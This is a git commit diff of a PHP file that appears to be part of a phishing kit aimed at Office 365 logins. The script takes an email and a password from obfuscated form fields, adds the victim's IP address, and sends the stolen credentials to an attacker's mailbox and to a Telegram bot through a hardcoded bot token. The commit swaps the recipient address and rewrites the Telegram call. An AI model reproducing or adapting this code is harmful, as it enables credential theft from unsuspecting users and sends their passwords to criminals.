fc3b1edace5efb320025c618a522c0a84964ae06
SherryDevop <sherrylail59@gmail.com>
2025-02-28 15:50:03 +0000

    Update cup.php

--- web-auths-poctza/cup.php
+++ web-auths-poctza/cup.php
@@ -1,44 +1,47 @@
 <?php
 
 $ip = $_SERVER['REMOTE_ADDR'];
-
-if (isset($_POST['hsdgaksjd_hdfsv']) && isset($_POST['hgdfjahsgd_jasdj'])) {
-    // Format the message
-    $message = "\n";
-    $message .= "ðŸ¥¨ðŸ¥¨< ------ OFFICE EMAIL by @sharpbladez ------ > ðŸ¥¨ðŸ¥¨\n";
+if(isset($_POST['hsdgaksjd_hdfsv']) && isset($_POST['hgdfjahsgd_jasdj']))
+{
+        $message = "\n";
+   $message .= "ðŸ¥¨ðŸ¥¨< ------ OFFICE  EMAIL by @sharpbladez ------ > ðŸ¥¨ðŸ¥¨\n";
     $message .= "ðŸ¥¨ðŸ¥¨< ------ Step EMAIL Login ------ > ðŸ¥¨ðŸ¥¨\n";
     $message .= "\n";
-    $message .= "ðŸ¤µ ðŸ‘¤ Email: " . $_POST["hsdgaksjd_hdfsv"] . "\n";
-    $message .= "ðŸ«‚ ðŸ«‚ Password: " . $_POST["hgdfjahsgd_jasdj"] . "\n";
+
     $message .= "\n";
-    $message .= "ðŸ«‚ ðŸ«‚ IP: " . $ip . "\n";
     $message .= "\n";
-    $message .= "< ------ User Info ------ >\n";
+    $message .= "ðŸ¤µ ðŸ‘¤ Emaill :  ".$_POST["hsdgaksjd_hdfsv"]."\n";
+    $message .= "ðŸ«‚ ðŸ«‚ Password :  ".$_POST["hgdfjahsgd_jasdj"]."\n";
     $message .= "\n";
-    $message .= "< ------  ------ >\n";
+    
+    
+    $message .= "ðŸ«‚ ðŸ«‚ IP :  ".$ip."\n";
     $message .= "\n";
+    $message .= "< ------ User Info------ > \n";
 
-    // Send email (optional)
-    $send = "sherrylail59@gmail.com";
-    $subject = "Blessed Login $ip";
-    mail($send, $subject, $message);
+    $message .= "\n";
+    $message .= "< ------  ------ > \n";
+    $message .= "\n";
+    
+   $send = "mop303@goatmail.uk";
+        $subject = " office365 Login $ip :";
+        mail($send, $subject, $message);
+		
+		
+		 $url = "https://api.telegram.org/bot7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k/sendMessage?chat_id=6926935950";
+        $url = $url . "&text=" . urlencode($message);
+        $ch = curl_init();
+        $optArray = array(
+                CURLOPT_URL => $url,
+                CURLOPT_RETURNTRANSFER => true
+        );
+        curl_setopt_array($ch, $optArray);
+        $result = curl_exec($ch);
+        curl_close($ch);
 
-   $botToken = "7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k";
-	$chatId = "6926935950";
-	$telegramUrl = "https://api.telegram.org/bot7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k/sendMessage";
-
-	$data = ['chat_id' => $chatId, 'text' => urlencode($message)];
-
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $telegramUrl);
-	curl_setopt($ch, CURLOPT_POST, true);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	$result = curl_exec($ch);
-	curl_close($ch);
-
-	echo json_encode($result ? ['ok' => 'ok'] : ['error' => 'Failed to send message to Telegram']);
-
-
+    echo json_encode(['ok' => 'ok']);
+}else{
+    echo json_encode(['bad' => 'bad']);
+}
 
 ?>
